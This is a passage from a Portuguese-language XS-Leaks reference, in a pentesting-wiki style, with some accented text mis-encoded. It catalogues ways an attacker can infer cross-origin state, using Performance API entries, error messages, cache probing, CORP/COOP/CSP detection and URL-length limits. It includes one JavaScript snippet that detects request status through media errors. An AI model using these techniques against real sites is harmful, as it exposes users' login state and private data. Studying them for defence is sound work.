A [`API de Performance`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) oferece insights sobre as m√©tricas de desempenho de aplica√ß√µes web, enriquecidas ainda mais pela [`API de Timing de Recursos`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). A API de Timing de Recursos permite monitorar detalhes dos tempos de solicita√ß√£o de rede, como a dura√ß√£o das solicita√ß√µes. Notavelmente, quando os servidores incluem o cabe√ßalho `Timing-Allow-Origin: *` em suas respostas, dados adicionais como o tamanho da transfer√™ncia e o tempo de busca de dom√≠nio ficam dispon√≠veis.

Essa riqueza de dados pode ser obtida por meio de m√©todos como [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ou [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), fornecendo uma vis√£o abrangente de informa√ß√µes relacionadas ao desempenho. Al√©m disso, a API facilita a medi√ß√£o dos tempos de execu√ß√£o calculando a diferen√ßa entre os carimbos de data/hora obtidos de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). No entanto, vale ressaltar que, para certas opera√ß√µes em navegadores como o Chrome, a precis√£o de `performance.now()` pode ser limitada a milissegundos, o que poderia afetar a granularidade das medi√ß√µes de tempo.

Al√©m das medi√ß√µes de tempo, a API de Performance pode ser aproveitada para insights relacionados √† seguran√ßa. Por exemplo, a presen√ßa ou aus√™ncia de p√°ginas no objeto `performance` no Chrome pode indicar a aplica√ß√£o de `X-Frame-Options`. Especificamente, se uma p√°gina for bloqueada de ser renderizada em um quadro devido a `X-Frame-Options`, ela n√£o ser√° registrada no objeto `performance`, fornecendo uma pista sutil sobre as pol√≠ticas de enquadramento da p√°gina.

### Vazamento de Erro

* **M√©todos de Inclus√£o**: Quadros, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Uma solicita√ß√£o que resulta em erros n√£o criar√° uma entrada de timing de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

√â poss√≠vel **diferenciar entre c√≥digos de status de resposta HTTP** porque as solicita√ß√µes que levam a um **erro** **n√£o criam uma entrada de desempenho**.

### Erro de Recarregamento de Estilo

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Devido a um bug do navegador, solicita√ß√µes que resultam em erros s√£o carregadas duas vezes.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Na t√©cnica anterior, tamb√©m foram identificados dois casos em que bugs do navegador no GC levam a **recursos sendo carregados duas vezes quando falham ao carregar**. Isso resultar√° em m√∫ltiplas entradas na API de Performance e, portanto, pode ser detectado.

### Erro de Mesclagem de Solicita√ß√£o

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Solicita√ß√µes que resultam em erro n√£o podem ser mescladas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

A t√©cnica foi encontrada em uma tabela no artigo mencionado, mas nenhuma descri√ß√£o da t√©cnica foi encontrada nela. No entanto, voc√™ pode encontrar o c√≥digo-fonte verificando isso em [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Vazamento de P√°gina Vazia

* **M√©todos de Inclus√£o**: Quadros
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Respostas vazias n√£o criam entradas de timing de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Um atacante pode detectar se uma solicita√ß√£o resultou em um corpo de resposta HTTP vazio porque **p√°ginas vazias n√£o criam uma entrada de desempenho em alguns navegadores**.

### **Vazamento do Auditor XSS**

* **M√©todos de Inclus√£o**: Quadros
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Usando o Auditor XSS em Assertivas de Seguran√ßa, os atacantes podem detectar elementos espec√≠ficos da p√°gina observando altera√ß√µes nas respostas quando payloads criados acionam o mecanismo de filtragem do auditor.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Em Assertivas de Seguran√ßa (SA), o Auditor XSS, originalmente destinado a prevenir ataques de Cross-Site Scripting (XSS), pode paradoxalmente ser explorado para vazar informa√ß√µes sens√≠veis. Embora esse recurso integrado tenha sido removido do Google Chrome (GC), ele ainda est√° presente em SA. Em 2013, Braun e Heiderich demonstraram que o Auditor XSS poderia inadvertidamente bloquear scripts leg√≠timos, levando a falsos positivos. Com base nisso, os pesquisadores desenvolveram t√©cnicas para extrair informa√ß√µes e detectar conte√∫do espec√≠fico em p√°ginas de origens cruzadas, um conceito conhecido como XS-Leaks, inicialmente relatado por Terada e elaborado por Heyes em um post de blog. Embora essas t√©cnicas fossem espec√≠ficas para o Auditor XSS no GC, descobriu-se que em SA, p√°ginas bloqueadas pelo Auditor XSS n√£o geram entradas na API de Performance, revelando um m√©todo pelo qual informa√ß√µes sens√≠veis ainda podem ser vazadas.

### Vazamento de X-Frame

* **M√©todos de Inclus√£o**: Quadros
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Resumo:** Recurso com cabe√ßalho X-Frame-Options n√£o cria uma entrada de timing de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Se uma p√°gina **n√£o √© permitida** para ser **renderizada** em um **iframe**, ela **n√£o cria uma entrada de desempenho**. Como resultado, um atacante pode detectar o cabe√ßalho de resposta **`X-Frame-Options`**.\
O mesmo acontece se voc√™ usar uma **tag de incorpora√ß√£o**. 

### Detec√ß√£o de Download

* **M√©todos de Inclus√£o**: Quadros
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Downloads n√£o criam entradas de timing de recurso na API de Performance.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Similar ao XS-Leak descrito, um **recurso que √© baixado** por causa do cabe√ßalho ContentDisposition, tamb√©m **n√£o cria uma entrada de desempenho**. Essa t√©cnica funciona em todos os principais navegadores.
### In√≠cio do Redirecionamento Leak

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Redirecionamento
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** O in√≠cio de tempo de um redirecionamento vaza atrav√©s da entrada de tempo de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Encontramos uma inst√¢ncia de XS-Leak que abusa do comportamento de alguns navegadores que registram muitas informa√ß√µes para solicita√ß√µes entre origens. O padr√£o define um subconjunto de atributos que devem ser definidos como zero para recursos entre origens. No entanto, em **SA** √© poss√≠vel detectar se o usu√°rio √© **redirecionado** pela p√°gina de destino, consultando a **API de Performance** e verificando os dados de tempo de **redirectStart**.

### Dura√ß√£o do Redirecionamento Leak

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Redirecionamento
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** A dura√ß√£o das entradas de tempo √© negativa quando ocorre um redirecionamento.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

No GC, a **dura√ß√£o** para solicita√ß√µes que resultam em um **redirecionamento** √© **negativa** e, portanto, pode ser **distingu√≠vel** de solicita√ß√µes que n√£o resultam em um redirecionamento.

### CORP Leak

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumo:** Recursos protegidos com CORP n√£o criam entradas de tempo de recurso.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Em alguns casos, a entrada **nextHopProtocol** pode ser usada como t√©cnica de vazamento. No GC, quando o **cabe√ßalho CORP** √© definido, o nextHopProtocol ser√° **vazio**. Note que o SA n√£o criar√° uma entrada de desempenho para recursos habilitados para CORP.

### Service Worker

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Resumo:** Detectar se um service worker est√° registrado para uma origem espec√≠fica.
* **Exemplo de C√≥digo**:

Os service workers s√£o contextos de script orientados a eventos que s√£o executados em uma origem. Eles s√£o executados em segundo plano de uma p√°gina da web e podem interceptar, modificar e **armazenar em cache recursos** para criar aplicativos da web offline.\
Se um **recurso armazenado em cache** por um **service worker** for acessado via **iframe**, o recurso ser√° **carregado do cache do service worker**.\
Para detectar se o recurso foi **carregado do cache do service worker**, a **API de Performance** pode ser usada.\
Isso tamb√©m pode ser feito com um ataque de Timing (verifique o artigo para mais informa√ß√µes).

### Cache

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Tempo
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Resumo:** √â poss√≠vel verificar se um recurso foi armazenado em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Usando a [API de Performance](xs-search.md#performance-api) √© poss√≠vel verificar se um recurso est√° em cache.

### Dura√ß√£o da Rede

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Resumo:** √â poss√≠vel recuperar a dura√ß√£o da rede de uma solicita√ß√£o da API `performance`.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## T√©cnica de Mensagens de Erro

### Erro de M√≠dia

* **M√©todos de Inclus√£o**: Elementos HTML (V√≠deo, √Åudio)
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Resumo:** No Firefox √© poss√≠vel vazar com precis√£o o c√≥digo de status de uma solicita√ß√£o entre origens.
* **Exemplo de C√≥digo**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### Erro CORS

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Nas Declara√ß√µes de Seguran√ßa (SA), mensagens de erro CORS exp√µem inadvertidamente a URL completa de solicita√ß√µes redirecionadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Essa t√©cnica permite a um atacante **extrair o destino de um redirecionamento de site de origem cruzada** ao explorar como os navegadores baseados em Webkit lidam com solicita√ß√µes CORS. Especificamente, quando uma solicita√ß√£o **habilitada para CORS** √© enviada a um site de destino que emite um redirecionamento com base no estado do usu√°rio e o navegador subsequentemente nega a solicita√ß√£o, a **URL completa do destino do redirecionamento** √© divulgada na mensagem de erro. Essa vulnerabilidade n√£o apenas revela o fato do redirecionamento, mas tamb√©m exp√µe o ponto final do redirecionamento e quaisquer **par√¢metros de consulta sens√≠veis** que possa conter.

### Erro SRI

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Nas Declara√ß√µes de Seguran√ßa (SA), mensagens de erro CORS exp√µem inadvertidamente a URL completa de solicita√ß√µes redirecionadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Um atacante pode explorar **mensagens de erro detalhadas** para deduzir o tamanho de respostas de origem cruzada. Isso √© poss√≠vel devido ao mecanismo de Integridade de Subrecursos (SRI), que usa o atributo de integridade para validar que os recursos buscados, frequentemente de CDNs, n√£o foram adulterados. Para o SRI funcionar em recursos de origem cruzada, estes devem ser **habilitados para CORS**; caso contr√°rio, n√£o est√£o sujeitos a verifica√ß√µes de integridade. Nas Declara√ß√µes de Seguran√ßa (SA), assim como o vazamento XS-Leak de erro CORS, uma mensagem de erro pode ser capturada ap√≥s uma solicita√ß√£o fetch com um atributo de integridade falhar. Os atacantes podem deliberadamente **desencadear esse erro** atribuindo um **valor de hash falso** ao atributo de integridade de qualquer solicita√ß√£o. Em SA, a mensagem de erro resultante revela inadvertidamente o comprimento do conte√∫do do recurso solicitado. Essa divulga√ß√£o de informa√ß√µes permite a um atacante discernir varia√ß√µes no tamanho da resposta, abrindo caminho para ataques sofisticados XS-Leak.

### Viola√ß√£o/Detec√ß√£o de CSP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumo:** Permitindo apenas o site da v√≠tima no CSP, se acessarmos e tentarmos redirecionar para um dom√≠nio diferente, o CSP acionar√° um erro detect√°vel.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Um XS-Leak pode usar o CSP para detectar se um site de origem cruzada foi redirecionado para uma origem diferente. Esse vazamento pode detectar o redirecionamento, mas adicionalmente, o dom√≠nio do destino do redirecionamento vaza. A ideia b√°sica desse ataque √© **permitir o dom√≠nio de destino no site do atacante**. Uma vez que uma solicita√ß√£o √© feita para o dom√≠nio de destino, ele **redireciona** para um dom√≠nio de origem cruzada. O **CSP bloqueia** o acesso a ele e cria um **relat√≥rio de viola√ß√£o usado como t√©cnica de vazamento**. Dependendo do navegador, **esse relat√≥rio pode vazar a localiza√ß√£o de destino do redirecionamento**.\
Navegadores modernos n√£o indicar√£o a URL para a qual foi redirecionado, mas ainda √© poss√≠vel detectar que um redirecionamento de origem cruzada foi acionado.

### Cache

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumo:** Limpe o arquivo do cache. Abra a p√°gina de destino, verifique se o arquivo est√° presente no cache.
* **Exemplo de C√≥digo:**

Os navegadores podem usar um cache compartilhado para todos os sites. Independentemente de sua origem, √© poss√≠vel deduzir se uma p√°gina de destino solicitou um **arquivo espec√≠fico**.

Se uma p√°gina carrega uma imagem apenas se o usu√°rio estiver logado, voc√™ pode **invalidar** o **recurso** (para que n√£o seja mais armazenado em cache, se estiver, veja mais informa√ß√µes nos links), **realizar uma solicita√ß√£o** que poderia carregar esse recurso e tentar carregar o recurso **com uma solicita√ß√£o inv√°lida** (por exemplo, usando um cabe√ßalho de refer√™ncia muito longo). Se o carregamento do recurso **n√£o acionar nenhum erro**, √© porque ele foi **armazenado em cache**.

### Diretiva CSP

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumo:** As diretivas de cabe√ßalho CSP podem ser sondadas usando o atributo de iframe CSP, revelando detalhes da pol√≠tica.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Um recurso inovador no Google Chrome (GC) permite que p√°ginas da web **proponham uma Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)** definindo um atributo em um elemento iframe, com diretivas de pol√≠tica transmitidas junto com a solicita√ß√£o HTTP. Normalmente, o conte√∫do incorporado deve **autorizar isso via um cabe√ßalho HTTP**, ou uma **p√°gina de erro √© exibida**. No entanto, se o iframe j√° estiver regido por um CSP e a pol√≠tica rec√©m-proposta n√£o for mais restritiva, a p√°gina ser√° carregada normalmente. Esse mecanismo abre um caminho para um atacante **detectar diretivas CSP espec√≠ficas** de uma p√°gina de origem cruzada identificando a p√°gina de erro. Embora essa vulnerabilidade tenha sido marcada como corrigida, nossas descobertas revelam uma **nova t√©cnica de vazamento** capaz de detectar a p√°gina de erro, sugerindo que o problema subjacente nunca foi totalmente resolvido.

### **CORP**

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumo:** Recursos protegidos com Cross-Origin Resource Policy (CORP) gerar√£o um erro ao serem buscados de uma origem n√£o permitida.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

O cabe√ßalho CORP √© um recurso de seguran√ßa relativamente novo na plataforma web que, quando definido, **bloqueia solicita√ß√µes de origem cruzada no-cors para o recurso fornecido**. A presen√ßa do cabe√ßalho pode ser detectada, pois um recurso protegido com CORP **gerar√° um erro ao ser buscado**.
### CORB

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Headers
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumo**: O CORB pode permitir que atacantes detectem quando o cabe√ßalho **`nosniff` est√° presente** na requisi√ß√£o.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Verifique o link para mais informa√ß√µes sobre o ataque.

### Erro de CORS na m√° configura√ß√£o de Reflex√£o de Origem <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Headers
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Resumo**: Se o cabe√ßalho de Origem for refletido no cabe√ßalho `Access-Control-Allow-Origin`, √© poss√≠vel verificar se um recurso j√° est√° em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Caso o **cabe√ßalho de Origem** seja **refletido** no cabe√ßalho `Access-Control-Allow-Origin`, um atacante pode abusar desse comportamento para tentar **buscar** o **recurso** no modo **CORS**. Se um **erro** n√£o for acionado, significa que ele foi **corretamente recuperado da web**; se um erro for acionado, √© porque ele foi **acessado a partir do cache** (o erro ocorre porque o cache salva uma resposta com um cabe√ßalho CORS permitindo o dom√≠nio original e n√£o o dom√≠nio do atacante).\
Observe que se a origem n√£o for refletida, mas um caractere curinga for usado (`Access-Control-Allow-Origin: *`), isso n√£o funcionar√°.

## T√©cnica de Atributos Leg√≠veis

### Redirecionamento de Fetch

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumo:** GC e SA permitem verificar o tipo de resposta (redirecionamento opaco) ap√≥s o redirecionamento ser conclu√≠do.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Ao enviar uma solicita√ß√£o usando a Fetch API com `redirect: "manual"` e outros par√¢metros, √© poss√≠vel ler o atributo `response.type` e, se for igual a `opaqueredirect`, ent√£o a resposta foi um redirecionamento.

### COOP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Header
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumo:** P√°ginas protegidas pela Pol√≠tica de Abertura de Origem Cruzada (COOP) impedem o acesso de intera√ß√µes entre origens cruzadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Um atacante √© capaz de deduzir a presen√ßa do cabe√ßalho de Pol√≠tica de Abertura de Origem Cruzada (COOP) em uma resposta HTTP de origem cruzada. A COOP √© utilizada por aplica√ß√µes web para impedir que sites externos obtenham refer√™ncias de janelas arbitr√°rias. A visibilidade desse cabe√ßalho pode ser discernida ao tentar acessar a **refer√™ncia `contentWindow`**. Em cen√°rios em que a COOP √© aplicada condicionalmente, a **propriedade `opener`** se torna um indicador revelador: ela √© **indefinida** quando a COOP est√° ativa e **definida** em sua aus√™ncia.

### Comprimento M√°ximo de URL - Lado do Servidor

* **M√©todos de Inclus√£o**: Fetch API, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumo:** Detectar diferen√ßas nas respostas devido ao comprimento da resposta de redirecionamento pode ser muito grande, fazendo com que o servidor responda com um erro e gere um alerta.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Se um redirecionamento do lado do servidor usar **entrada do usu√°rio dentro do redirecionamento** e **dados extras**, √© poss√≠vel detectar esse comportamento porque geralmente os **servidores** t√™m um **limite de comprimento de solicita√ß√£o**. Se os **dados do usu√°rio** tiverem esse **comprimento - 1**, porque o **redirecionamento** est√° usando **esses dados** e **adicionando** algo **extra**, ele acionar√° um **erro detect√°vel por meio de Eventos de Erro**.

Se voc√™ de alguma forma puder definir cookies para um usu√°rio, tamb√©m pode realizar esse ataque **definindo cookies suficientes** ([**bomba de cookies**](hacking-with-cookies/cookie-bomb.md)) para que, com o **aumento do tamanho da resposta** correta, um **erro** seja acionado. Nesse caso, lembre-se de que se voc√™ acionar essa solicita√ß√£o a partir de um mesmo site, `<script>` enviar√° automaticamente os cookies (para que voc√™ possa verificar os erros).\
Um exemplo do **bomba de cookies + XS-Search** pode ser encontrado na solu√ß√£o pretendida deste artigo: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou estar no mesmo contexto geralmente √© necess√°rio para esse tipo de ataque.

### Comprimento M√°ximo de URL - Lado do Cliente

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumo:** Detectar diferen√ßas nas respostas devido ao comprimento da resposta de redirecionamento pode ser muito grande para uma solicita√ß√£o que uma diferen√ßa possa ser notada.
* **Exemplo de C√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

De acordo com a [documenta√ß√£o do Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), o comprimento m√°ximo de URL do Chrome √© de 2MB.

> Em geral, a _plataforma web_ n√£o tem limites no comprimento de URLs (embora 2^31 seja um limite comum). O _Chrome_ limita URLs a um comprimento m√°ximo de **2MB** por raz√µes pr√°ticas e para evitar problemas de nega√ß√£o de servi√ßo na comunica√ß√£o entre processos.

Portanto, se o **URL de redirecionamento respondido for maior em um dos casos**, √© poss√≠vel fazer com que ele redirecione com um **URL maior que 2MB** para atingir o **limite de comprimento**. Quando isso acontece, o Chrome mostra uma p√°gina **`about:blank#blocked`**.

A **diferen√ßa percept√≠vel** √© que se o **redirecionamento** foi **conclu√≠do**, `window.origin` gera um **erro** porque uma origem cruzada n√£o pode acessar essa informa√ß√£o. No entanto, se o **limite** foi atingido e a p√°gina carregada foi **`about:blank#blocked`**, a **`origin`** da janela permanece a do **pai**, que √© uma **informa√ß√£o acess√≠vel**.

Todas as informa√ß√µes extras necess√°rias para atingir os **2MB** podem ser adicionadas via um **hash** no URL inicial para que seja **usado no redirecionamento**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}
### N√∫mero M√°ximo de Redirecionamentos

